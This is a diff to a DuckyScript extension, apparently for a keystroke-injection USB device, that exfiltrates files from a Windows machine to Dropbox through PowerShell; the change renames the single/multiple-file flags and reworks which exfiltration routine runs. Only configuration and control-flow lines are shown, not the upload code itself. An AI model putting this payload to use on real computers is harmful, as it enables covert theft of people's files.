@@ -15,13 +15,15 @@ EXTENSION SEND_FILES_THROUGH_DROPBOX_WINDOWS
         CONFIGURATION:
             Set #DROPBOX_ACCESS_TOKEN with a string - the string must be your personal Dropbox access token created from your Dropbox account.
 
-            Set #SINGLE-FILE with TRUE if you want to send just one file. In this case you will need to specify the file path within the #SINGLE-PATH variable OR, in case the exact path to the file you can only acquire it at runtime and so via the powershell, use in the powershell the $dropboxFilePath variable to capture this path.
+            Set #FLAG-SINGLE-FILE with TRUE if you want to send just one file.
+            In this case you will need to specify the file path within the #SINGLE-PATH variable OR, in case the exact path to the file you can only acquire it at runtime and so via the powershell, use in the powershell the $dropboxFilePath variable to capture this path.
                 i.e. in DuckyScript EXTENSION
-                    DEFINE #SINGLE-FILE C:\Users\Aleff\Downloads\photo.png
+                    DEFINE #SINGLE-PATH C:\Users\Aleff\Downloads\photo.png
                 i.e. in PowerShell before extension
                     $dropboxFilePath = "C:\Users\Aleff\Downloads\photo.png"
 
-            Set #MULTIPLE-FILES TRUE if you want to send multiple files. In this case in the PowerShell you will have to create the variable $dropboxFilePaths, which is an array of strings that should contain the list of paths related to the files you want to export.
+            Set #FLAG-SINGLE-FILE FALSE if you want to send multiple files.
+            In this case in the PowerShell you will have to create the variable $dropboxFilePaths, which is an array of strings that should contain the list of paths related to the files you want to export.
                 i.e. in PowerShell before extension:
                     $dropboxFilePaths = @(
                         "C:\Users\Aleff\Downloads\photo.png",
@@ -42,9 +44,8 @@ EXTENSION SEND_FILES_THROUGH_DROPBOX_WINDOWS
 
     REM Settings
     DEFINE #DROPBOX_ACCESS_TOKEN 0
-    DEFINE #SINGLE-FILE FALSE
+    DEFINE #FLAG-SINGLE-FILE FALSE
     DEFINE #SINGLE-PATH 0
-    DEFINE #MULTIPLE-FILES FALSE
 
 
     REM From now don't change anything else.
@@ -97,11 +98,11 @@ EXTENSION SEND_FILES_THROUGH_DROPBOX_WINDOWS
 
         STRINGLN #UPLOAD-URL
 
-        IF_DEFINED_TRUE #SINGLE-FILE
+        IF_DEFINED_TRUE #FLAG-SINGLE-FILE
             SINGLE-FILE-EXFILTRATION()
         END_IF_DEFINED
 
-        IF_DEFINED_TRUE #MULTIPLE-FILES
+        IF_NOT_DEFINED_TRUE #FLAG-SINGLE-FILE
             MULTIPLE-FILES-EXFILTRATION()
         END_IF_DEFINED
     END_IF
